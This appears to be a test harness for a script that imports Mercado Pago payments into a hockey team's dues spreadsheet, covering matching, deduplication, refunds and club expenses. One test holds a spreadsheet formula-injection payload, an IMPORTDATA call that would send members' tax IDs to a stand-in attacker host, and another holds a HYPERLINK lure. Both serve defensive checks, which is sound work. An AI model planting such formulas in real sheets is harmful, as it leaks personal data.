'use strict';
const path = require('path');
const { createWorld } = require('./mocks');

const CODE = process.env.CODIGO || path.join(__dirname, '..', 'Codigo.gs');
const ME = 111111111;
const CLUB = 222222222;
const ID = { Juancho: 333000001, Flaco: 333000002, Tano: 333000003, Dieguito: 333000006 };
const VERBOSE = process.argv.includes('-v');

// ------------------------------------------------------------ helpers
const results = [];
let current = '';
function section(name) { current = name; console.log('\n=== ' + name); }
function check(label, cond, detail) {
  results.push({ scenario: current, label, ok: !!cond, detail });
  console.log((cond ? '  PASS ' : '  FAIL ') + label + (cond || !detail ? '' : '\n         -> ' + detail));
}
function info(s) { console.log('  info ' + s); }

/** ART local "YYYY-MM-DD HH:mm" -> MP-style ISO string in -04:00 */
function mpDate(local) {
  const ms = Date.parse(local.replace(' ', 'T') + ':00-03:00');
  return new Date(ms - 4 * 3600e3).toISOString().replace('Z', '-04:00');
}
const art = local => new Date(Date.parse(local.replace(' ', 'T') + ':00-03:00'));
const nowIso = local => local.replace(' ', 'T') + ':00-03:00';

function pay(o) {
  const created = mpDate(o.created);
  const p = {
    id: o.id,
    date_created: created,
    date_approved: o.status && o.status !== 'approved' ? null : (o.approved ? mpDate(o.approved) : created),
    date_last_updated: o.updated ? mpDate(o.updated) : created,
    status: o.status || 'approved',
    status_detail: o.status === 'rejected' ? 'cc_rejected_other_reason' : 'accredited',
    operation_type: o.op || 'money_transfer',
    payment_type_id: o.ptype || 'account_money',
    payment_method_id: o.pmethod || 'account_money',
    collector_id: o.collector == null ? ME : o.collector,
    payer: {
      id: o.payerId == null ? null : o.payerId,
      identification: o.cuit ? { type: 'CUIT', number: o.cuit } : { type: null, number: null },
      first_name: o.first || null, last_name: o.last || null, email: o.email || null,
    },
    transaction_amount: o.amount,
    net_received_amount: +(o.amount * 0.994).toFixed(2),
    description: o.desc || '',
    point_of_interaction: o.bankName ? { transaction_data: { bank_info: { payer: { long_name: o.bankName } } } } : {},
  };
  return p;
}

const CANCHA_OP = 182263652715;
function basePayments() {
  return [
    // the manual Cancha row in Gastos (paid before "Importar desde")
    pay({ id: CANCHA_OP, created: '2026-10-02 09:00', payerId: ME, collector: CLUB, amount: 120000 }),
  ];
}

function seed(world, o = {}) {
  const headerI = ['Nombre', 'Apodo', 'Categoría', 'Teléfono', 'Email', 'CUIT/CUIL', 'Alta', 'Activo', 'Notas', 'ID Mercado Pago'];
  world.addSheet('Integrantes', [
    headerI,
    ['Juan Pérez', 'Juancho', 'A', '', '', '20-30111222-3', '', 'Sí', '', ''],
    ['Martín Gómez', 'Flaco', 'A', '', '', 20301112224, '', 'Sí', '', ''],
    ['Lucas Tanoni', 'Tano', 'A', '', '', '23351234569', '', 'Sí', '', ''],
    ['Pedro Colombo', 'Colo', 'A', '', '', '', '', 'Sí', '', ''],
    ['Diego Ruiz', 'Dieguito', 'A', '', '', '20-28999111-5', '', 'Sí', '', ''],
  ], o.integrantesCols || 26);

  const headerP = ['Fecha', 'Integrante', 'Monto', 'Imputación', 'Medio', 'Nombre de origen', 'CUIT', 'CVU/CBU', 'N° de operación', 'Notas'];
  const apodos = ['Juancho', 'Flaco', 'Tano', 'Colo', 'Dieguito'];
  const pagosRows = [headerP];
  for (let i = 0; i < 13; i++) {
    const d = new Date(Date.UTC(2026, 8, 5 + i * 2, 3, 0, 0)); // midnight ART, 05/09 .. 29/09
    const opCell = o.pagosOpFmt ? { value: 180000000100 + i, fmt: o.pagosOpFmt } : 180000000100 + i;
    pagosRows.push([{ value: d, fmt: 'dd/mm/yyyy' }, apodos[i % 5], 15000, 'Cuota', 'Transferencia Mercado Pago',
      '', '', '', opCell, '']);
  }
  world.addSheet('Pagos', pagosRows);

  const headerG = ['Fecha', 'Tipo', 'Concepto', 'Monto', 'Sale de', 'Destinatario', 'N° de operación', 'Notas'];
  const gOp = o.gastosOp != null ? o.gastosOp : CANCHA_OP;
  world.addSheet('Gastos', [headerG,
    [{ value: art('2026-10-02 00:00'), fmt: 'dd/mm/yyyy' }, 'Cancha', 'Cancha octubre', 120000, 'Cuotas del mes',
      'Club Social y Deportivo Aberastain', o.gastosOpFmt ? { value: gOp, fmt: o.gastosOpFmt } : gOp, ''],
  ]);

  const cfg = [];
  for (let r = 1; r <= 36; r++) cfg.push(['', '']);
  cfg[0] = ['Parámetro', 'Valor'];
  cfg[3] = ['Cuota mensual ($)', 15000];
  cfg[15] = [{ value: art('2026-10-01 00:00'), fmt: 'mmm yyyy' }, 120000];
  cfg[16] = [{ value: art('2026-11-01 00:00'), fmt: 'mmm yyyy' }, 150000];
  cfg[32] = ['Importar pagos desde', { value: o.importarDesde || art('2026-10-10 00:00'), fmt: 'dd/mm/yyyy' }];
  cfg[33] = ['ID cuenta del club', ''];
  cfg[34] = ['Última sincronización', ''];
  cfg[35] = ['Resultado', ''];
  world.addSheet('Config', cfg);
}

function newWorld(payments, o = {}) {
  const w = createWorld({ codePath: CODE, me: ME, payments: payments, mp: o.mp || {}, ui: o.ui });
  seed(w, o);
  return w;
}

function snapshot(w) {
  const s = {};
  for (const [n, sh] of w.sheets) if (n !== 'Config') s[n] = JSON.stringify(sh.rows(1)); // Config B35/B36 change every run
  return s;
}
function sync(w, when) {
  w.setNow(nowIso(when));
  try { w.run('sincronizar'); return null; } catch (e) { return e; }
}
const rowsOf = (w, n) => (w.sheet(n) ? w.sheet(n).rows(2) : []);
const revisar = w => rowsOf(w, 'Por revisar');
const findOp = (rows, col, id) => rows.filter(r => r[col] === String(id));
const B = (w, a1) => w.sheet('Config').getRange(a1).getDisplayValue();
function dump(w, n) { if (!VERBOSE) return; console.log('  --- ' + n); rowsOf(w, n).forEach(r => console.log('    ' + JSON.stringify(r))); }

// ============================================================ Scenario 1..5 (one world, chronological)
section('S1 first sync (now 12/10/2026 15:00)');
const W = newWorld(basePayments().concat([
  pay({ id: 1001, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  pay({ id: 1002, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'bank_transfer', pmethod: 'cvu', payerId: ME, amount: 15000 }),
  pay({ id: 1003, created: '2026-10-11 09:00', payerId: 444000001, cuit: '27999888776', amount: 8000 }),
  pay({ id: 1004, created: '2026-10-11 12:00', payerId: ME, collector: CLUB, amount: 120000 }),
  pay({ id: 1005, created: '2026-10-11 13:00', payerId: ME, collector: 555000001, amount: 5000 }),
  pay({ id: 1006, created: '2026-10-11 14:00', status: 'rejected', payerId: ID.Flaco, cuit: '20301112224', amount: 15000 }),
]));
let err = sync(W, '2026-10-12 15:00');
check('sync does not throw', !err, err && err.stack);
const p1 = rowsOf(W, 'Pagos');
check('Pagos keeps the 13 manual rows + 1 new', p1.length === 14, 'Pagos rows=' + p1.length);
const r1001 = findOp(p1, 8, 1001)[0];
check('1001 (Juancho by CUIT) -> Pagos as Cuota', r1001 && r1001[1] === 'Juancho' && r1001[2] === '15000' && r1001[3] === 'Cuota',
  JSON.stringify(r1001));
check('1001 CUIT stored as text digits', r1001 && r1001[6] === '20301112223', JSON.stringify(r1001));
check('Juancho MP id learned in Integrantes!J2 as text',
  W.sheet('Integrantes').raw(2, 10).v === String(ID.Juancho), JSON.stringify(W.sheet('Integrantes').raw(2, 10)));
const rv1 = revisar(W);
check('Por revisar sheet created', !!W.sheet('Por revisar'));
check('1002 (bank account_fund, payer==me) -> Por revisar w/o payer id', findOp(rv1, 7, 1002).length === 1 && findOp(rv1, 7, 1002)[0][6] === '',
  JSON.stringify(rv1));
check('1003 (stranger) -> Por revisar "No coincide"', findOp(rv1, 7, 1003).length === 1 && /No coincide/.test(findOp(rv1, 7, 1003)[0][8]),
  JSON.stringify(rv1));
check('Por revisar has exactly 2 rows', rv1.length === 2, 'rows=' + rv1.length);
const g1 = rowsOf(W, 'Gastos');
check('1004 (admin->club) -> Gastos Cancha octubre', findOp(g1, 6, 1004).length === 1 && findOp(g1, 6, 1004)[0][2] === 'Cancha octubre',
  JSON.stringify(g1));
check('Gastos has exactly 2 rows (manual + 1004)', g1.length === 2, JSON.stringify(g1));
const all = JSON.stringify([p1, rv1, g1]);
check('1005 (admin->someone else) copied nowhere', all.indexOf('"1005"') === -1);
check('1006 (rejected) copied nowhere', all.indexOf('"1006"') === -1);
check('Config B34 = club id (auto-detected)', B(W, 'B34') === String(CLUB), B(W, 'B34'));
check('Config B35 = last sync set', B(W, 'B35') !== '', B(W, 'B35'));
info('B36 = ' + B(W, 'B36'));
info('fetches: ' + W.fetches.length + ' -> ' + W.fetches.map(u => u.replace('https://api.mercadopago.com', '').replace(/\?.*/, '')).join(', '));
dump(W, 'Pagos'); dump(W, 'Por revisar'); dump(W, 'Gastos');

section('S2 second sync with the same data (now 12/10/2026 15:30)');
let before = snapshot(W);
err = sync(W, '2026-10-12 15:30');
check('sync does not throw', !err, err && err.stack);
let after = snapshot(W);
for (const n of ['Pagos', 'Por revisar', 'Gastos', 'Integrantes']) {
  check(n + ' unchanged', before[n] === after[n], n);
}
info('B36 = ' + B(W, 'B36'));

section('S3 payment older than "Importar desde" is ignored');
W.payments.push(pay({ id: 1007, created: '2026-10-08 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 17000 }));
err = sync(W, '2026-10-12 16:00');
check('sync does not throw', !err, err && err.stack);
check('1007 (08/10) not loaded (API honours range)', JSON.stringify(snapshot(W)).indexOf('1007') === -1);
W.mpOpts.ignoreRange = true; // even if the API returned it, the script must filter it
err = sync(W, '2026-10-12 16:30');
check('sync does not throw (API ignoring range)', !err, err && err.stack);
check('1007 not loaded even when API returns it', JSON.stringify(snapshot(W)).indexOf('1007') === -1);
W.mpOpts.ignoreRange = false;

section('S4 member pays twice same day same amount');
W.payments.push(pay({ id: 1008, created: '2026-10-13 10:00', payerId: ID.Tano, cuit: '23351234569', amount: 15000 }));
W.payments.push(pay({ id: 1009, created: '2026-10-13 10:30', payerId: ID.Tano, cuit: '23351234569', amount: 15000 }));
err = sync(W, '2026-10-13 12:00');
check('sync does not throw', !err, err && err.stack);
check('1008 -> Pagos (Tano)', findOp(rowsOf(W, 'Pagos'), 8, 1008).length === 1);
check('1009 -> Por revisar as "Posible duplicado"', findOp(revisar(W), 7, 1009).length === 1 && /Posible duplicado/.test(findOp(revisar(W), 7, 1009)[0][8]),
  JSON.stringify(revisar(W)));
check('1009 not in Pagos', findOp(rowsOf(W, 'Pagos'), 8, 1009).length === 0);
before = snapshot(W);
err = sync(W, '2026-10-13 12:30');
check('re-sync: nothing new', JSON.stringify(before) === JSON.stringify(snapshot(W)));

section('S5 learned payer.id used when CUIT is missing');
W.payments.push(pay({ id: 1010, created: '2026-10-14 10:00', payerId: ID.Juancho, amount: 15000 }));
err = sync(W, '2026-10-14 12:00');
check('sync does not throw', !err, err && err.stack);
check('1010 (no CUIT, learned id) -> Pagos Juancho', findOp(rowsOf(W, 'Pagos'), 8, 1010).length === 1 && findOp(rowsOf(W, 'Pagos'), 8, 1010)[0][1] === 'Juancho',
  JSON.stringify(revisar(W)));
before = snapshot(W);
err = sync(W, '2026-10-14 12:30');
check('final re-sync: nothing new', !err && JSON.stringify(before) === JSON.stringify(snapshot(W)));
info('final counts: Pagos=' + rowsOf(W, 'Pagos').length + ' Revisar=' + revisar(W).length + ' Gastos=' + rowsOf(W, 'Gastos').length + ' | B36=' + B(W, 'B36'));

section('S1b union dedupe: unfiltered search also returns payer==me payments');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 1004, created: '2026-10-11 12:00', payerId: ME, collector: CLUB, amount: 120000 }),
  ]), { mp: { unfilteredIncludesPayer: true } });
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('club payment loaded exactly once', findOp(rowsOf(w, 'Gastos'), 6, 1004).length === 1, JSON.stringify(rowsOf(w, 'Gastos')));
}

section('S1c probarConexion runs');
{
  const alerts = [];
  const w = newWorld(basePayments().concat([
    pay({ id: 1001, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  ]), { ui: { alert: t => alerts.push(t) } });
  w.setNow(nowIso('2026-10-12 15:00'));
  let e2 = null; try { w.run('probarConexion'); } catch (e) { e2 = e; }
  check('probarConexion does not throw', !e2, e2 && e2.stack);
  info('alert: ' + JSON.stringify(alerts[0]));
}

// ============================================================ Deviation probes
section('D1 same sync: CUIT-matched payment then same payer without CUIT');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2101, created: '2026-10-10 10:00', payerId: ID.Flaco, cuit: '20301112224', amount: 15000 }),
    pay({ id: 2102, created: '2026-10-11 10:00', payerId: ID.Flaco, amount: 5000, desc: 'tercer tiempo' }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('2101 -> Pagos Flaco', findOp(rowsOf(w, 'Pagos'), 8, 2101).length === 1);
  check('2102 (same payer.id, learned in this same run) -> Pagos Flaco',
    findOp(rowsOf(w, 'Pagos'), 8, 2102).length === 1,
    '2102 went to Por revisar: ' + JSON.stringify(findOp(revisar(w), 7, 2102)));
}

section('D2 admin pays something else to the club account (QR at club canteen)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 1004, created: '2026-10-11 12:00', payerId: ME, collector: CLUB, amount: 120000 }),
    pay({ id: 2201, created: '2026-10-11 22:00', op: 'regular_payment', ptype: 'account_money', payerId: ME, collector: CLUB, amount: 3500, desc: 'Buffet' }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('1004 (transfer to club) -> Gastos', findOp(rowsOf(w, 'Gastos'), 6, 1004).length === 1);
  check('2201 (personal QR purchase at club, operation_type regular_payment) NOT copied',
    findOp(rowsOf(w, 'Gastos'), 6, 2201).length === 0,
    'copied as: ' + JSON.stringify(findOp(rowsOf(w, 'Gastos'), 6, 2201)));
}

section('D3 attacker-controlled text written to non-text cells (formula injection)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2301, created: '2026-10-11 09:00', payerId: 444000009, cuit: '20111111112', amount: 1,
      desc: '=IMPORTDATA("https://attacker.example/?d="&TEXTJOIN(",",TRUE,Integrantes!F2:F40))' }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('description stored as plain text, not as a formula', w.formulas.length === 0, 'formulas created: ' + w.formulas.join(' | '));
}

section('D4 trigger running before "Importar desde" (today 09/10, B33=10/10)');
{
  const w = newWorld(basePayments(), { mp: { invalidRange: 'error400' } });
  err = sync(w, '2026-10-09 20:00');
  check('no error when Importar desde is in the future (API rejects begin>end)', !err, err && (err.message + ' | B36=' + B(w, 'B36')));
  info('search URL: ' + (w.fetches.find(u => /search/.test(u)) || '').replace('https://api.mercadopago.com', ''));
  const w2 = newWorld(basePayments(), { mp: { invalidRange: 'empty' } });
  err = sync(w2, '2026-10-09 20:00');
  info('if API instead returns empty: error=' + (err ? err.message : 'none') + ' B36=' + B(w2, 'B36'));
}

section('D5 manual op number displayed with thousands separators (format #,##0)');
{
  // The club payment 182263652715 falls inside the import window and was also typed by hand in Gastos.
  const pays = [pay({ id: CANCHA_OP, created: '2026-10-10 09:00', payerId: ME, collector: CLUB, amount: 120000 })];
  const w = newWorld(pays, { gastosOpFmt: '#,##0' });
  info('Gastos!G2 displays as "' + w.sheet('Gastos').getRange('G2').getDisplayValue() + '"');
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('already-typed club payment not duplicated', findOp(rowsOf(w, 'Gastos'), 6, CANCHA_OP).length === 0 && rowsOf(w, 'Gastos').length === 1,
    'Gastos now: ' + JSON.stringify(rowsOf(w, 'Gastos')));
}

section('D6 admin handles a Por revisar row (moves it to Pagos, deletes it from Por revisar)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2601, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'bank_transfer', payerId: ME, amount: 15000 }),
  ]));
  err = sync(w, '2026-10-10 12:00');
  check('2601 -> Por revisar', findOp(revisar(w), 7, 2601).length === 1);
  // admin: adds the cuota to Pagos for Colo (as README says), and deletes the handled row from Por revisar
  const pg = w.sheet('Pagos'); const last = pg.getLastRow() + 1;
  pg.getRange(last, 1, 1, 10).setValues([[w.mkDate(art('2026-10-10 00:00').getTime()), 'Colo', 15000, 'Cuota', 'Transferencia bancaria', '', '', '', '', 'de Por revisar']]);
  const rv = w.sheet('Por revisar'); rv.getRange(2, 1, 1, 10).setValues([['', '', '', '', '', '', '', '', '', '']]);
  err = sync(w, '2026-10-10 12:30');
  check('handled transfer does not come back to Por revisar', findOp(revisar(w), 7, 2601).length === 0,
    'reappeared: ' + JSON.stringify(findOp(revisar(w), 7, 2601)));
}

section('D6b new member: admin copies CUIT from Por revisar, loads the cuota by hand, deletes the row');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2650, created: '2026-10-10 23:00', payerId: 333000004, cuit: '20334445556', amount: 15000 }),
  ]));
  err = sync(w, '2026-10-10 23:30');
  check('2650 (Colo, CUIT not yet in Integrantes) -> Por revisar', findOp(revisar(w), 7, 2650).length === 1);
  // next morning, following README: add CUIT to Integrantes, load cuota in Pagos (dated the day it was processed), delete handled row
  w.sheet('Integrantes').getRange('F5').setValue('20-33444555-6');
  const pg = w.sheet('Pagos'); const last = pg.getLastRow() + 1;
  pg.getRange(last, 1, 1, 10).setValues([[w.mkDate(art('2026-10-11 00:00').getTime()), 'Colo', 15000, 'Cuota', 'Transferencia Mercado Pago', '', '20334445556', '', '', '']]);
  w.sheet('Por revisar').getRange(2, 1, 1, 10).setValues([['', '', '', '', '', '', '', '', '', '']]);
  err = sync(w, '2026-10-11 09:00');
  const colo = rowsOf(w, 'Pagos').filter(r => r[1] === 'Colo' && /10\/2026/.test(r[0]));
  check('Colo\'s single transfer counted once in Pagos', colo.length === 1, 'Pagos rows for Colo in Oct: ' + JSON.stringify(colo));
}

section('D11 Integrantes sheet with only 9 physical columns (no column J yet)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 3001, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  ]), { integrantesCols: 10 });
  err = sync(w, '2026-10-12 15:00');
  check('works with exactly 10 columns', !err, err && err.message);
  const w9 = createWorld({ codePath: CODE, me: ME, payments: basePayments(), mp: {} });
  seed(w9, {});
  // rebuild Integrantes with 9 columns
  const old = w9.sheet('Integrantes'); w9.sheets.delete('Integrantes');
  w9.addSheet('Integrantes', old.rows(1).map(r => r.slice(0, 9)), 9);
  err = sync(w9, '2026-10-12 15:00');
  info('with 9 columns: ' + (err ? 'THROWS: ' + err.message : 'ok') + ' | B36=' + B(w9, 'B36'));
}

section('D12 receipt number != API id, manual row same day/amount (dedupe fallback)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 3201, created: '2026-10-10 10:00', payerId: ID.Dieguito, cuit: '20289991115', amount: 15000 }),
  ]));
  const pg = w.sheet('Pagos'); const last = pg.getLastRow() + 1;
  pg.getRange(last, 1, 1, 10).setValues([[w.mkDate(art('2026-10-10 00:00').getTime()), 'Dieguito', 15000, 'Cuota', 'Transferencia Mercado Pago', '', '', '', '55555555555', '']]);
  err = sync(w, '2026-10-12 15:00');
  check('not double-loaded (goes to Por revisar as posible duplicado)', findOp(rowsOf(w, 'Pagos'), 8, 3201).length === 0 && findOp(revisar(w), 7, 3201).length === 1,
    JSON.stringify(rowsOf(w, 'Pagos').slice(-2)));
}

section('D7 club auto-detection resolves to the admin\'s own account');
{
  // The last "Cancha" row in Gastos carries the op number of a payment where the admin is the COLLECTOR
  const pays = basePayments().concat([
    pay({ id: 2700, created: '2026-10-01 10:00', op: 'account_fund', ptype: 'bank_transfer', payerId: ME, amount: 120000 }),
    pay({ id: 2701, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'bank_transfer', payerId: ME, amount: 15000 }),
  ]);
  const w = newWorld(pays, { gastosOp: 2700 });
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  info('B34 detected as ' + B(w, 'B34') + ' (admin id is ' + ME + ')');
  check('club id is never the admin\'s own id', B(w, 'B34') !== String(ME), 'B34=' + B(w, 'B34'));
  check('incoming bank transfer 2701 not booked as a Cancha expense', findOp(rowsOf(w, 'Gastos'), 6, 2701).length === 0,
    JSON.stringify(rowsOf(w, 'Gastos')));
}

section('D8 more than 1000 matching payments in the window (e.g. after a long outage)');
{
  const pays = basePayments();
  pays.push(pay({ id: 2800, created: '2026-10-10 08:00', payerId: ID.Dieguito, cuit: '20289991115', amount: 15000 }));
  let t = Date.parse('2026-10-10T09:00:00-03:00');
  for (let i = 0; i < 1005; i++) {
    const d = new Date(t + i * 60e3);
    const loc = new Date(d.getTime() - 3 * 3600e3).toISOString().slice(0, 16).replace('T', ' ');
    pays.push(pay({ id: 900000 + i, created: loc, op: 'regular_payment', payerId: 700000000 + i, amount: 100 }));
  }
  const w = newWorld(pays);
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('oldest member payment 2800 loaded', findOp(rowsOf(w, 'Pagos'), 8, 2800).length === 1,
    'lost; B35 advanced to ' + B(w, 'B35') + ', B36="' + B(w, 'B36') + '" (no warning)');
}

section('D9 transfer approved more than 2 days after it was created');
{
  const p = pay({ id: 2900, created: '2026-10-10 10:00', status: 'in_process', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 });
  const w = newWorld(basePayments().concat([p]));
  for (const t of ['2026-10-10 12:00', '2026-10-11 12:00', '2026-10-12 12:00', '2026-10-13 09:00']) sync(w, t);
  p.status = 'approved'; p.date_approved = mpDate('2026-10-13 09:30'); p.date_last_updated = p.date_approved;
  sync(w, '2026-10-13 10:00');
  sync(w, '2026-10-13 10:30');
  check('late-approved transfer eventually imported', findOp(rowsOf(w, 'Pagos'), 8, 2900).length === 1,
    'never imported (search range is date_created >= last sync - 2 days)');
}

section('D10 date stored with time-of-day');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 3001, created: '2026-10-31 18:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  ]));
  sync(w, '2026-11-01 10:00');
  const r = w.sheet('Pagos').getLastRow();
  info('Pagos!A' + r + ' display = "' + w.sheet('Pagos').display(r, 1) + '" (manual rows are midnight dates); a SUMIFS(A:A,"<="&DATE(2026,10,31)) excludes it');
}


section('N1 member pays an amount that is not a multiple of the cuota');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4101, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 21000 }),
  ]));
  err = sync(w, '2026-10-10 12:00');
  check('sync does not throw', !err, err && err.stack);
  const r = findOp(rowsOf(w, 'Pagos'), 8, 4101);
  check('21000 -> Pagos with Imputación "Revisar"', r.length === 1 && r[0][3] === 'Revisar', JSON.stringify(r));
}

section('N2 large personal income and personal non-transfer movements are not copied');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4201, created: '2026-10-10 10:00', payerId: 444000077, cuit: '20999000111', amount: 500000 }),
    pay({ id: 4202, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'ticket', pmethod: 'rapipago', payerId: ME, amount: 15000 }),
    pay({ id: 4203, created: '2026-10-10 12:00', payerId: 444000078, cuit: '20999000222', amount: 500 }),
  ]));
  err = sync(w, '2026-10-10 15:00');
  check('sync does not throw', !err, err && err.stack);
  const all = rowsOf(w, 'Pagos').concat(revisar(w));
  check('500000 from stranger not copied', findOp(revisar(w), 7, 4201).length === 0 && findOp(rowsOf(w, 'Pagos'), 8, 4201).length === 0);
  check('own cash deposit (account_fund, not bank transfer) not copied', findOp(revisar(w), 7, 4202).length === 0);
  check('500 from stranger (below minimum) not copied', findOp(revisar(w), 7, 4203).length === 0);
}

section('N3 refund of a payment already loaded is reported once');
{
  const p = pay({ id: 4301, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 });
  const w = newWorld(basePayments().concat([p]));
  sync(w, '2026-10-10 12:00');
  check('4301 -> Pagos', findOp(rowsOf(w, 'Pagos'), 8, 4301).length === 1);
  p.status = 'refunded'; p.transaction_amount_refunded = 15000; p.date_last_updated = mpDate('2026-10-11 09:00');
  err = sync(w, '2026-10-11 10:00');
  check('sync does not throw', !err, err && err.stack);
  const dev = findOp(revisar(w), 7, 'R4301');
  check('Por revisar gets one "Devolución" row', dev.length === 1 && dev[0][2] === 'Devolución', JSON.stringify(revisar(w)));
  sync(w, '2026-10-11 10:30');
  check('no second Devolución row', findOp(revisar(w), 7, 'R4301').length === 1);
}

section('N4 club payments: with late surcharge -> Gastos; odd amount -> Por revisar');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4401, created: '2026-10-12 10:00', payerId: ME, collector: CLUB, amount: 126000 }),
    pay({ id: 4402, created: '2026-10-12 11:00', payerId: ME, collector: CLUB, amount: 50000 }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  const g = findOp(rowsOf(w, 'Gastos'), 6, 4401);
  check('126000 (5% surcharge) -> Gastos Cancha with surcharge note', g.length === 1 && g[0][1] === 'Cancha' && /recargo/.test(g[0][7]), JSON.stringify(rowsOf(w, 'Gastos')));
  const e = findOp(revisar(w), 7, 4402);
  check('50000 -> Por revisar as Egreso', e.length === 1 && e[0][2] === 'Egreso', JSON.stringify(revisar(w)));
  sync(w, '2026-10-12 15:30');
  check('re-sync: club rows not duplicated', findOp(rowsOf(w, 'Gastos'), 6, 4401).length === 1 && findOp(revisar(w), 7, 4402).length === 1);
}

section('N5 sender name that looks like a formula is stored as text');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4501, created: '2026-10-10 10:00', payerId: 444000079, cuit: '20999000333', amount: 15000, first: '=HYPERLINK("https://x.example";"Cobrar")' }),
  ]));
  err = sync(w, '2026-10-10 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('no formulas created', w.formulas.length === 0, 'formulas: ' + w.formulas.join(' | '));
}

section('W1 app del equipo: datos sin información personal');
{
  const w = newWorld(basePayments());
  w.addSheet('Resumen', [
    ['Caja Hockey', ''],
    ['', ''],
    ['Mes actual', { value: art('2026-10-01 00:00'), fmt: 'mmm yyyy' }],
    ['', ''], ['', ''],
    ['Integrantes con el mes pago', 3],
    ['Integrantes en total', 5],
    ['Integrantes necesarios para cubrir la cancha', 8],
    ['Recaudado para la cancha ($)', 45000],
    ['Costo de la cancha ($)', 120000],
    ['Faltan ($)', 75000],
    ['Cobertura', 0.375],
    ['Vence el', { value: art('2026-10-10 00:00'), fmt: 'dd/mm/yyyy' }],
    ['Cancha del mes pagada', 'Sí'],
    ['', ''], ['', ''], ['', ''], ['', ''],
    ['', ''], ['', ''],
    ['Saldo en caja ($)', 96000],
    ['Cuotas pagadas por adelantado ($)', 15000],
    ['Disponible para equipamiento ($)', 81000],
    ['', ''], ['', ''],
    ['Integrantes con deuda', 2],
    ['Deuda total, incluido el mes actual ($)', 30000],
  ]);
  const meses = [];
  for (let i = 0; i < 12; i++) meses.push({ value: art(`${2026 + Math.floor((9 + i) / 12)}-${String((9 + i) % 12 + 1).padStart(2, '0')}-01 00:00`), fmt: 'mmm yy' });
  const est = n => Array.from({ length: 12 }, (_, i) => (i < n ? 'Pagado' : (i === 0 ? 'Debe' : '')));
  w.addSheet('Cuotas', [
    ['Integrante', 'Pagado', 'Meses', 'A cuenta', 'Debe', 'Adelantado', 'Pagado hasta'].concat(meses),
    ['Juancho', 45000, 3, 0, 0, 30000, 'dic 26'].concat(est(3)),
    ['Colo', 0, 0, 0, 15000, 0, '-'].concat(est(0)),
    ['Totales', 45000, 3, 0, 15000, 30000, ''],
  ]);
  w.sheet('Config').getRange('B7').setValue('luciopepi');
  w.sheet('Config').getRange('B28').setValue(art('2026-10-01 00:00'));
  let d, e2;
  try { d = w.run('datosApp_'); } catch (e) { e2 = e; }
  check('datosApp_ does not throw', !e2, e2 && e2.stack);
  if (d) {
    const json = JSON.stringify(d);
    check('cancha and caja read by label', d.cancha.costo === 120000 && d.cancha.faltan === 75000 && d.cancha.pagada === true && d.caja.fondo === 81000, JSON.stringify(d.cancha) + JSON.stringify(d.caja));
    check('integrantes stop at Totales', d.integrantes.length === 2 && d.integrantes[1].apodo === 'Colo', JSON.stringify(d.integrantes.map(m => m.apodo)));
    check('estados and debt per member', d.integrantes[0].estados[2] === 'Pagado' && d.integrantes[1].debe === 15000 && d.integrantes[1].hasta === '', JSON.stringify(d.integrantes[1]));
    check('mes actual index found', d.mesIdx === 0 && d.meses.length === 12, d.mesIdx + ' ' + d.meses.length);
    check('payments attached to members', d.integrantes[0].pagos.length > 0, JSON.stringify(d.integrantes[0].pagos));
    check('no CUIT, operation numbers or names', !/20-?30111222|180000000\d+|182263652715|Juan Pérez|Club Social/.test(json), json.slice(0, 300));
    check('movimientos mixes ingresos and gastos', d.movimientos.some(m => m.ingreso) && d.movimientos.some(m => !m.ingreso) && d.movimientos.length <= 40);
    check('result cached', !!(w.cache && w.cache.datosApp));
  }
  sync(w, '2026-10-10 15:00');
  check('sync clears the app cache', !(w.cache && w.cache.datosApp) && w.cacheRemoved > 0);
}

// ============================================================ panel del administrador
function addAppSheets(w, apodos) {
  w.addSheet('Resumen', [
    ['Caja Hockey', ''], ['', ''],
    ['Mes actual', { value: art('2026-10-01 00:00'), fmt: 'mmm yyyy' }],
    ['', ''], ['', ''],
    ['Integrantes con el mes pago', 3], ['Integrantes en total', 5],
    ['Integrantes necesarios para cubrir la cancha', 8], ['Recaudado para la cancha ($)', 45000],
    ['Costo de la cancha ($)', 120000], ['Faltan ($)', 75000], ['Cobertura', 0.375],
    ['Vence el', { value: art('2026-10-10 00:00'), fmt: 'dd/mm/yyyy' }], ['Cancha del mes pagada', 'Sí'],
